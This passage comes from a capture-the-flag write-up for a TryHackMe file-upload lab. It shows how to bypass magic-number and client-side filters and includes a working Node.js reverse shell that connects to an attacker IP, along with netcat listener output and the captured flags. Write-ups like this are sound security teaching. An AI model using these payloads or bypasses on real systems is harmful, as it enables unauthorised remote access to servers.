</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>connect to <span style="color:#89dceb;font-weight:bold">[</span>10.6.67.243<span style="color:#89dceb;font-weight:bold">]</span> from <span style="color:#89dceb;font-weight:bold">(</span>UNKNOWN<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>10.10.103.254<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">56504</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Linux a2b9a5609bd8 4.15.0-109-generic <span style="color:#6c7086;font-style:italic">#110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span> 03:50:14 up  1:26,  <span style="color:#fab387">0</span> users,  load average: 0.03, 0.01, 0.00
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#f5e0dc">uid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">gid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">groups</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>/bin/sh: 0: can<span style="color:#f38ba8">&#39;</span>t access tty; job control turned off
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>bin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>boot
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>dev
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>etc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>home
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>lib
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>lib32
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>lib64
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>libx32
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>media
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>mnt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>opt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>proc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>sbin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>srv
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>sys
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>tmp
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>usr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>var
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>$ <span style="color:#89dceb">cd</span> /var/www
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span>html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>$ cat flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<br>
<h3 id="bypassing-server-side-filtering-magic-numbers">Bypassing Server-Side Filtering: Magic Numbers</h3>
<p>Head to magic.uploadvulns.thm &ndash; it&rsquo;s time for the last mini-challenge.</p>
<p>Bypass the magic number filter to upload a shell. Find the location of the uploaded shell and activate it. Your flag is in /var/www/.</p>
<p>Grab the flag from /var/www/</p>






<pre tabindex="0"><code>THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}</code></pre>
<br>
<p>The website only accepts GIF type files.</p>
<p><img src="image-21.png#center" alt="alt text"></p>
<br>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>$ file shell.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>shell.php: PHP script, ASCII text</span></span></code></pre></div>
<p>As you can see, our current shell has the type of PHP script. In order to bypass the magic number filtering, we have to add the GIF magic number to the top of our shell.php file.</p>
<p>GIF has a couple magic numbers but I am going to use <code>47 49 46 38 37 61</code>.</p>
<p>Let&rsquo;s open up the reverse shell script and add four random characters on the first line. This is just a temporary placeholder so these characters do not matter.</p>
<p><img src="image-16.png#center" alt="alt text">
<br></p>
<p>Let&rsquo;s open up the file in <code>hexeditor</code> now. The first line has value of <code>41 41 41 41</code> which represents the values AAAA we put on the first line of the file. Let&rsquo;s change them to JPEG magic numbers, <code>47 49 46 38 37 61</code></p>
<p><img src="image-17.png#center" alt="alt text">
<img src="image-20.png#center" alt="alt text"></p>
<br>
<p>If we run the file command again to see the file type, it now says it&rsquo;s GIF type.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>$ file shell.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>shell.php: GIF image data, version 87a, <span style="color:#fab387">28735</span> x <span style="color:#fab387">28776</span></span></span></code></pre></div>
<p><img src="image-19.png#center" alt="alt text"></p>
<br>
<p>Let&rsquo;s upload the file now and instead of navigating to <code>/graphics</code> (because directory indexing is turned off for this website), we are going to access the shell directly using its URI like the following:</p>
<p><code>http://magic.uploadvulns.thm/graphics/shell.php?cmd=whoami;</code></p>
<p>As you could see from the below, I was running the netcat server to capture the reverse shell and eventually got the flag.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ nc -lvnp <span style="color:#fab387">1234</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">1234</span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>connect to <span style="color:#89dceb;font-weight:bold">[</span>10.6.67.243<span style="color:#89dceb;font-weight:bold">]</span> from <span style="color:#89dceb;font-weight:bold">(</span>UNKNOWN<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>10.10.103.254<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">38598</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Linux 94d79a333b8d 4.15.0-109-generic <span style="color:#6c7086;font-style:italic">#110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span> 04:35:03 up  2:11,  <span style="color:#fab387">0</span> users,  load average: 0.00, 0.02, 0.01
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#f5e0dc">uid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">gid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">groups</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>/bin/sh: 0: can<span style="color:#f38ba8">&#39;</span>t access tty; job control turned off
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>bin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>boot
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>dev
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>etc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>home
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>lib
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>lib32
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>lib64
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>libx32
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>media
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>mnt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>opt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>proc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>sbin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>srv
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>sys
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>tmp
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>usr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>var
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>$ <span style="color:#89dceb">cd</span> /var/www/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span>html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>$ cat flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<br>
<h3 id="challenge">Challenge</h3>
<p>For this task, we are given a black-box file upload challenge to complete.</p>
<p>Head over to jewel.uploadvulns.thm.</p>
<p>Take what you&rsquo;ve learned in this room and use it to get a shell on this machine. As per usual, your flag is in /var/www/.</p>
<p>Hack the machine and grab the flag from /var/www/</p>






<pre tabindex="0"><code>THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}</code></pre>
<br>
<p>Using Burpsuite, I captured the request on the website and the backend is running Javascript, as we can see from the <code>X-Powered-By: Express</code>.</p>
<p><img src="image-24.png#center" alt="alt text"></p>
<p>Also the static <code>upload.js</code> file shows that the upload only accepts <code>jpg or jpeg</code> file format.</p>
<p><img src="image-22.png#center" alt="alt text"></p>
<br>
<p>Since we found the backend is running javascript, we need the javascript version of rever shell script not the PHP that we&rsquo;ve been using so far.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>(<span style="color:#f38ba8">function</span> () {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>  <span style="color:#f38ba8">var</span> net <span style="color:#89dceb;font-weight:bold">=</span> require(<span style="color:#a6e3a1">&#34;net&#34;</span>),
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>    cp <span style="color:#89dceb;font-weight:bold">=</span> require(<span style="color:#a6e3a1">&#34;child_process&#34;</span>),
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>    sh <span style="color:#89dceb;font-weight:bold">=</span> cp.spawn(<span style="color:#a6e3a1">&#34;/bin/sh&#34;</span>, []);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>  <span style="color:#f38ba8">var</span> client <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#cba6f7">new</span> net.Socket();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>  client.connect(<span style="color:#fab387">8080</span>, <span style="color:#a6e3a1">&#34;10.17.26.64&#34;</span>, <span style="color:#f38ba8">function</span> () {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>    client.pipe(sh.stdin);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>    sh.stdout.pipe(client);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>    sh.stderr.pipe(client);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>  });
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>  <span style="color:#cba6f7">return</span> <span style="color:#94e2d5">/a/</span>; <span style="color:#6c7086;font-style:italic">// Prevents the Node.js application form crashing
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#6c7086;font-style:italic"></span>})();</span></span></code></pre></div>
<br>
<p>It seems like we can bypass three checks from the client-side: file size, magic number, and file extension. I am just going to delete all of the checks.
<img src="image-32.png#center" alt="alt text"></p>
<br>
<p>Now the file upload has been successful.</p>
<p><img src="image-27.png#center" alt="alt text">
<br></p>
<p>I&rsquo;ve already found the relative directories for image uploads by using the gobuster command that I&rsquo;ve been using for this room.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ gobuster dir -u http://jewel.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Gobuster v3.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>by OJ Reeves <span style="color:#89dceb;font-weight:bold">(</span>@TheColonial<span style="color:#89dceb;font-weight:bold">)</span> &amp; Christian Mehlmauer <span style="color:#89dceb;font-weight:bold">(</span>@firefart<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Url:                     http://jewel.uploadvulns.thm
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Method:                  GET
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Threads:                 <span style="color:#fab387">10</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Negative Status codes:   <span style="color:#fab387">404</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> User Agent:              gobuster/3.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Timeout:                 <span style="color:#f5e0dc">10s</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Starting gobuster in directory enumeration <span style="color:#f5e0dc">mode</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>/content              <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 181<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; /content/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>/modules              <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 181<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; /modules/<span style="color:#89dceb;font-weight:bold">]</span>
